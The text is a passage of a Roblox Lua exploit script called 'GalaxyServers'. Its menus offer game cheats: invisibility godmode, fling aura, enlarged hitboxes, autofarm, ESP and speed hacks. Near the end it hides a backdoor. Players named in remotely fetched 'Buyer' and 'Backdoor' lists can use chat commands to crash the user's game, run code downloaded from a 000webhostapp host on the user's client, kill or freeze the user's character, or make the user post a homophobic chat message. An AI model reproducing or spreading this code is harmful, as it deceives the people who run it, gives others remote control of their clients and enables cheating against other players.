        local Player   = game:GetService('Players').LocalPlayer

        local function RigType()
            if Player.Character then
                local Humanoid = Player.Character:WaitForChild('Humanoid')
                if Humanoid.RigType == Enum.HumanoidRigType.R15 then
                    return 'R15'
                else
                    return 'R6'
                end
            end
        end

        local function Invis()
            local Character = Player.Character
            local StoredCF = Character.PrimaryPart.CFrame
            local Part = Instance.new('Part',workspace)
            Part.Size = Vector3.new(5,0,5)
            Part.Anchored = true
            Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
            Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
            spawn(function()
                wait(3)
                Part:Destroy()
            end)
            if RigType() == 'R6' then
                local Clone = Character.HumanoidRootPart:Clone()
                Character.HumanoidRootPart:Destroy()
                Clone.Parent = Character
            else
                local Clone = Character.LowerTorso.Root:Clone()
                Character.LowerTorso.Root:Destroy()
                Clone.Parent = Character.LowerTorso
            end
            wait(1)
            Character.PrimaryPart.CFrame = StoredCF
        end

        Invis()
    end)

    local Label = pee:AddLabel("Must reset to remove Invisible Godmode!")

    local value = false
    local Toggle = ff:AddToggle("Fling Aura", {flag = "alvl", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return d:Disconnect()
                end
                pcall(function()
                    local args = {
                        [1] = game.Players.LocalPlayer:GetMouse().hit.p,
                        [2] = true
                    }
                        
                    game:GetService("ReplicatedStorage").Events.ToggleTelekinesis:InvokeServer(unpack(args))
                end)
            end)
        end
    end)

    local size = 10
    local Toggle = hit:AddToggle("HitBox Visibility", {flag = "hvis", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then
                            v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                            v.Character.HumanoidRootPart.Transparency = 1
                        end
                    end
                    return d:Disconnect()
                end
                if s then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then
                            v.Character.HumanoidRootPart.Size = Vector3.new(size, size, size)
                            v.Character.HumanoidRootPart.Transparency = 0.5
                            v.Character.HumanoidRootPart.CanCollide = false
                            v.Character.HumanoidRootPart.Material = "SmoothPlastic"
                        end
                    end
                end
            end)
        end
    end)

    local Slider = hit:AddSlider("HitBox Size", 5, 100, 10, {toggleable = false, default = false, flag = "hs", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        size = val
    end)

    local Label = gui:AddLabel("Version: ".. getgenv().Version)

    local Picker = gui:AddPicker("UI Color", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)
    gui:AddLabel("LeftControl to minimize UI")

    local ClipboardLabel = gui:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function BuildaBoat()
    local Symmetrical = Library:AddWindow({
        title = {"GalaxyServers", "Build a Boat"},
        theme = {
            Accent = Color3.fromRGB(255,105,180)
        },
        key = Enum.KeyCode.RightControl,
        default = true
    })
    local general = Symmetrical:AddTab("General", {default = false})
    local pee = general:AddSection("Main", {default = false})
    local farm = general:AddSection("Farming", {default = false})
    local Universal = Symmetrical:AddTab("Universal", {default = false})
    local Esp = Universal:AddSection("Visuals", {default = false})
    local generalCamera = Universal:AddSection("Camera", {default = false})
    local generalPlayer = Universal:AddSection("Player", {default = false})
    
    local value = false
    pee:AddToggle("GodMode", {flag = "gmode", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                game:GetService("Players").LocalPlayer.Character.WaterDetector:Destroy()
            end)
        end
    end)
    
    local value = false
    local Timev = false
    local Time = 0
    local Toggle = farm:AddToggle("AutoFarm", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        spawn(function()
            if value == true then
                Notification.Notify(
                    "GalaxyServers", 
                    "Theres a wait of like 15 seconds, please wait!", 
                    "rbxassetid://16201262", {
                    Duration = 5,
                    TitleSettings = {
                        TextXAlignment = Enum.TextXAlignment.Center,
                        Font = Enum.Font.SourceSansSemibold,
                    },
                    GradientSettings = {
                        GradientEnabled = false,
                        SolidColorEnabled = true,
                        SolidColor = Color3.fromRGB(124, 83, 240),
                        Retract = true
                    }
                });
            end
        end)
        while wait(25) do
            if value == true then
                pcall(function()
                    game.workspace.Gravity = 0
                    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-142.677292, 109.114311, 736.056458))
                    wait(1)
                    local CFrameEnd = CFrame.new(-52.9965401, 79.506752, 8646.33984)
                    local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = CFrameEnd})
                    Time = Timev
                    tween:Play()
                    tween.Completed:Wait()
                    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-48.2867279, -358.622314, 8826.5))
                    local CFrameEnd = CFrame.new(-55.4865074, -360.404236, 9488.46973) 
                    Time = 3
                    local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = CFrameEnd})
                    tween:Play()
                    tween.Completed:Wait()
                    game.workspace.Gravity = 196.2
                end)
            end
        end
    end)
    
    local Slider = farm:AddSlider("Farm Run Length", 10, 43, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        Timev = value
        Time = Timev
    end)

    local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()

    ESP.Players = true
    ESP.Boxes = false
    ESP.Tracers = false
    ESP.Names = false
    ESP:Toggle(true)
    
    ESP:AddObjectListener(Workspace, {
        Name = "",
        CustomName = "",
        Color = Color3.fromRGB(0, 0, 0),
        IsEnabled = "whatever"
    })
    ESP.whatever = true
    
    local Toggle = Esp:AddToggle("Name ESP", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Names = true
            else
                ESP.Names = false
            end
        end)
    end)
    
    local Toggle = Esp:AddToggle("Boxes", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Boxes = true
            else
                ESP.Boxes = false
            end
        end)
    end)
    
    local Toggle = Esp:AddToggle("Tracers", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Tracers = true
            else
                ESP.Tracers = false
            end
        end)
    end)
    
    local Picker = Esp:AddPicker("Color", {color = Color3.fromRGB(255, 0, 0)}, function(color)
        ESP.Color = color
    end)
    local adjustlighing = false
    local Toggle = Esp:AddToggle("Adjust lighting", {flag = "Toggle_Flag", default = false}, function(s)
        adjustlighing = s
    end)
    local uni_time;
    local Slider = Esp:AddSlider("Clock time", 1, 239, 1, {toggleable = true, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
    uni_time = value
        while wait() do
            if adjustlighing == true then
                game.Lighting.ClockTime = uni_time
            end
        end
    end)
    local Toggle = Esp:AddToggle("Enable reset", {flag = "Toggle_Flag", default = false}, function(s)
        uniantilag = s
        if uniantilag then 
            local refresh
            refresh = game:service('RunService').Stepped:connect(function() 
                if not uniantilag then 
                    return refresh:Disconnect() 
                end 
                pcall(function()
                    game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
                end)
            end)
        end
    end)
    local Toggle = Esp:AddToggle("Less lag", {flag = "Toggle_Flag", default = false}, function(s)
        uniantilag = s
        if uniantilag then 
            local refresh
            refresh = game:service('RunService').Stepped:connect(function() 
                if not uniantilag then 
                    return refresh:Disconnect() 
                end 
                pcall(function()
                    for _, v in pairs(game.Workspace:GetChildren()) do
                        if v.Name == "Part" or v.Name == "Union" then
                            v.Material = Enum.Material.SmoothPlastic
                        end
                    end
                end)
            end)
        end
    end)
    local selected;
    local stop_spec = false
    local Box = generalCamera:AddBox("Spectate player", {fireonempty = true}, function(v)
        selected = v
        game.Workspace.CurrentCamera.CameraSubject = game.Players[selected].Character.Humanoid
    end)
    local Button = generalCamera:AddButton("Stop spectating", function()
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
    end)
    local walkspeed = false
    local Toggle = generalPlayer:AddToggle("Toggle walkspeed", {flag = "Toggle_Flag", default = false}, function(s)
        walkspeed = s
    end)
    game:service('RunService').Stepped:connect(function(s)
        if walkspeed == false then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
        end
    end)
    local uni_speed;
    local Slider = generalPlayer:AddSlider("Walkspeed", 16, 239, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
    uni_speed = value
        while wait() do
            if walkspeed == true then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = uni_speed
            end
        end
    end)
    local jumppower = false
    local Toggle = generalPlayer:AddToggle("Toggle jumppower", {flag = "Toggle_Flag", default = false}, function(s)
        jumppower = s
    end)
    game:service('RunService').Stepped:connect(function(s)
        if jumppower == false then
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
        end
    end)
    local uni_jpower;
    local Slider = generalPlayer:AddSlider("Jumppower", 16, 239, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
    uni_jpower = value
        while wait() do
            if jumppower == true then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = uni_jpower
            end
        end
    end)
    local Misc = Symmetrical:AddTab("Misc", {default = false})
    local generalMisc = Misc:AddSection("General", {default = false})
    
    local Picker = generalMisc:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Symmetrical:SetAccent(color)
    end)
    
    local Label = generalMisc:AddLabel("LeftControl to minimize UI")
    
    local ClipboardLabel = generalMisc:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

spawn(function()
    Notification.Notify(
        "GalaxyServers "..Version, 
        "Thank you for using GalaxyServers!", 
        "rbxassetid://4914902889", {
        Duration = 5,
        TitleSettings = {
            TextXAlignment = Enum.TextXAlignment.Center,
            Font = Enum.Font.SourceSansSemibold,
        },
        GradientSettings = {
            GradientEnabled = false,
            SolidColorEnabled = true,
            SolidColor = Color3.fromRGB(124, 83, 240),
            Retract = true
        }
    });
end)

-- Checking for games, and running specific game functions.

if game.PlaceId == Games["IronMan Simulator"] then
    IronManSimulator()
end

if game.PlaceId == Games["IronMan Simulator 2"] then
    IronManSimulator2()
end

if game.PlaceId == Games["IronMan Battlegrounds"] then
    IronManBattlegrounds()
end

if game.PlaceId == Games["Flee the Facility"] then
    FleetheFacility()
end

if game.PlaceId == Games["Destruction Simulator"] then
    DestructionSimulator()
end

if game.PlaceId == Games["SPFS"] then
    SPFS()
end

if game.PlaceId == Games["Vehicle Simulator"] then
    VehicleSimulator()
end

if game.PlaceId == Games["Vehicle Tycoon"] then
    VehicleTycoon()
end

if game.PlaceId == Games["Age of Heros"] then
    AgeofHeros()
end

if game.PlaceId == Games["Build a Boat"] then
    BuildaBoat()
end

local function GetPlayer(String)
    local plr
    local strl = String:lower()
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                plr = v
            end
        end
        if String == "" or String == " " then
            plr = nil
        end
        if plr == game.Players:FindFirstChild('NotVeurects') or plr == game.Players:FindFirstChild('Spectuwo') then
            plr = nil
            spawn(function()
                Notification.Notify(
                    "Access Denied", 
                    "You cannot peform any actions on Founders", 
                    "rbxassetid://16201262", {
                    Duration = 5,
                    TitleSettings = {
                                TextXAlignment = Enum.TextXAlignment.Center,
                                Font = Enum.Font.SourceSansSemibold,
                            },
            
                            GradientSettings = {
                                GradientEnabled = false,
                                SolidColorEnabled = true,
                                SolidColor = Color3.fromRGB(124, 83, 240),
                                Retract = true
                            }
                });
            end)
        end
    return plr
end

local prefix = ","

local Buyer = loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Buyer"))()

local Backdoor = loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Backdoor"))()

for i,v in pairs(game.Players:GetPlayers()) do
    if table.find(Buyer, v.Name) or table.find(Backdoor, v.Name) then
        v.Chatted:connect(function(msg)
            msg = msg:lower()
            if string.sub(msg,1,3) == "/e " then
                msg = string.sub(msg,4)
            end
            if string.sub(msg,1,1) == prefix then
                local cmd
                local space = string.find(msg," ")
                if space then
                    cmd = string.sub(msg,2,space-1)
                else
                    cmd = string.sub(msg,2)
                end 
                if cmd == "shutdown" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game:Shutdown()
                    end
                end
                if cmd == "hack" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Hack"))()
                        game:Shutdown()
                    end
                end
                if cmd == "hell" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Hell"))()
                        game:Shutdown()
                    end
                end   
                if cmd == "ghcheck" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." I am using GalaxyServers", "All")
                end
                if cmd == "kill" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character:BreakJoints()
                    end
                end
                if cmd == "bring" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
                    end
                end
                if cmd == "freeze" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    end
                end
                if cmd == "unfr" then
                    local var  =  string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                end
                if cmd == "rejoin" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        local Place = game.placeId
                        local job = game.JobId
                        game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
                    end
                end
                if cmd == "crip" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart:Destroy()
                    end
                end
                if cmd == "nuke" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Nuke"))()
                    end
                end
                if cmd == "snek" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Snek"))()
                    end
                end
                if cmd == "scp" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/SCP"))()
                    end
                end
                if cmd == "expose" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("IM GAY AND LIKE BIG MEN WEEN", "All")
                    end
                end
            end      
        end)
    end
end

game:service('Players').PlayerAdded:connect(function(v)
    if table.find(Buyer, v.Name) or table.find(Backdoor, v.Name) then
        v.Chatted:connect(function(msg)
            msg = msg:lower()
            if string.sub(msg,1,3) == "/e " then
                msg = string.sub(msg,4)
            end
            if string.sub(msg,1,1) == prefix then
                local cmd
                local space = string.find(msg," ")
                if space then
                    cmd = string.sub(msg,2,space-1)
                else
                    cmd = string.sub(msg,2)
                end 
                if cmd == "shutdown" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game:Shutdown()
                    end
                end
                if cmd == "hack" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Hack"))()
                        game:Shutdown()
                    end
                end
                if cmd == "hell" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Hell"))()
                        game:Shutdown()
                    end
                end   
                if cmd == "ghcheck" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." I am using GalaxyServers", "All")
                end
                if cmd == "kill" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character:BreakJoints()
                    end
                end
                if cmd == "bring" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
                    end
                end
                if cmd == "freeze" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    end
                end
                if cmd == "unfr" then
                    local var  =  string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                end
                if cmd == "rejoin" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        local Place = game.placeId
                        local job = game.JobId
                        game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
                    end
                end
                if cmd == "crip" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game.Players.LocalPlayer.Character.HumanoidRootPart:Destroy()
                    end
                end
                if cmd == "nuke" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Nuke"))()
                    end
                end
                if cmd == "snek" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Snek"))()
                    end
                end
                if cmd == "scp" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/SCP"))()
                    end
                end
                if cmd == "expose" then
                    local var = string.sub(msg,space+1)
                    local target = GetPlayer(var)
                    if game.Players.LocalPlayer == target then
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("IM GAY AND LIKE BIG MEN WEEN", "All")
                    end
                end
            end      
        end)
    end
end)
